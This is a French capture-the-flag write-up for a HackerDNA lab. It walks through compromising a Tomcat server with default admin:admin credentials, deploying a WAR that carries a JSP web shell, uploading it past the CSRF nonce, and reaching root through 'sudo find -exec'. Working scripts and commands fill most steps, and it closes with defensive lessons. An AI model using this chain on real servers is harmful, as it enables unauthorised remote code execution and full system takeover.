# Compte rendu : Compromised 1

Plateforme : HackerDNA (https://hackerdna.com/labs/compromised-1)
Auteur : SRH
Difficulté : Moyenne
Tags : Apache Tomcat, Default Credentials, WAR Deployment, JSP Web Shell, Sudo Find, Privilege Escalation
XP : +400 XP

## Scénario
Un serveur Apache Tomcat a été laissé avec des configurations par défaut dangereuses et des mauvaises configurations sudo qui pourraient mener à la compromission complète du système. L'objectif est de maîtriser l'art de l'exploitation d'applications web, du déploiement de fichiers WAR et de l'escalade de privilèges Linux.

Prérequis : fondamentaux des applications web, connaissances de base en Java, ligne de commande Linux, familiarité avec les mécanismes d'authentification.

## Chaîne d'Attaque
[Reconnaissance] → [Tomcat Manager (admin:admin)] → [Création d'un WAR malveillant] → [Upload avec nonce CSRF] → [Web Shell JSP] → [Flag user] → [Énumération sudo] → [Escalade via sudo find] → [Flag root] → 🚩

## Étape 1 — Reconnaissance
Le scan Nmap révèle deux ports ouverts : le port 80 (Apache httpd 2.4.65) et le port 8080 (Apache Tomcat 9.0.96). Le port 80 est une page statique sans intérêt. Le port 8080 expose le Tomcat Manager.

nmap -sV -p 80,8080 <IP>

## Étape 2 — Connexion au Tomcat Manager
Le Manager est accessible à /manager/html et protégé par HTTP Basic. Les identifiants par défaut admin:admin fonctionnent.

curl -s -u "admin:admin" "http://<IP>:8080/manager/html" -o mgr.html -w "HTTP %{http_code}\n"
# → HTTP 200

## Étape 3 — Création du WAR malveillant
On crée un fichier JSP qui exécute des commandes via Runtime.getRuntime().exec(), puis on l'empaquette dans un WAR.

python3 -c "
import zipfile
with zipfile.ZipFile('cmd.war', 'w', zipfile.ZIP_DEFLATED) as war:
    war.writestr('cmd.jsp', '''<%@ page import=\"java.io.*\" %>
<%
String cmd = request.getParameter(\"cmd\");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>''')
"

## Étape 4 — Upload avec nonce CSRF
On récupère le cookie de session et le nonce CSRF depuis la page du Manager, puis on uploade le WAR.

curl -s -c cj.txt -u admin:admin "http://<IP>:8080/manager/html" -o mgr.html
NONCE=$(grep -oE 'CSRF_NONCE=[a-f0-9]+' mgr.html | head -1 | cut -d= -f2)
SID=$(awk '/JSESSIONID/{print $7}' cj.txt)

curl -s -u admin:admin -b cj.txt \
  -F "deployWar=@cmd.war;filename=cmd.war" \
  -F "deploy=Deploy" \
  -F "path=/cmd" \
  -F "org.apache.catalina.filters.CSRF_NONCE=$NONCE" \
  "http://<IP>:8080/manager/html/upload;jsessionid=$SID?org.apache.catalina.filters.CSRF_NONCE=$NONCE"

## Étape 5 — Test du web shell et flag utilisateur
On teste l'exécution de commandes via le web shell JSP déployé.

curl -s "http://<IP>:8080/cmd/cmd.jsp?cmd=id"
# → uid=1000(hacker) gid=1000(hacker)

curl -s "http://<IP>:8080/cmd/cmd.jsp?cmd=cat%20/home/flag-user.txt"
# → Flag User : <USER_FLAG>

## Étape 6 — Énumération sudo
On vérifie les droits sudo de l'utilisateur hacker.

curl -s "http://<IP>:8080/cmd/cmd.jsp?cmd=sudo%20-l"
# → (ALL) NOPASSWD: /usr/bin/find

## Étape 7 — Flag root via sudo find
find avec -exec permet d'exécuter une commande en root (GTFOBins). On lit directement le flag root.

curl -s "http://<IP>:8080/cmd/cmd.jsp?cmd=sudo%20/usr/bin/find%20-exec%20cat%20/root/flag-root.txt%20%5C%3B%20-quit"
# → Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre une chaîne d'exploitation complète : un Tomcat Manager accessible avec les identifiants par défaut admin:admin, un déploiement de WAR malveillant pour obtenir une RCE via un web shell JSP, puis une escalade root via une règle sudo mal configurée (find en NOPASSWD). Chaque étape repose sur une mauvaise configuration classique.

## Leçons Apprises
1. Toujours changer les identifiants par défaut de Tomcat Manager.
2. Restreindre l'accès au Manager aux adresses IP internes ou le désactiver en production.
3. Ne jamais laisser un utilisateur déployer des WAR arbitraires : cela équivaut à une RCE.
4. Auditer les règles sudo : find avec -exec permet une exécution de commande arbitraire en root.
5. Appliquer le principe du moindre privilège sur les comptes de service.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
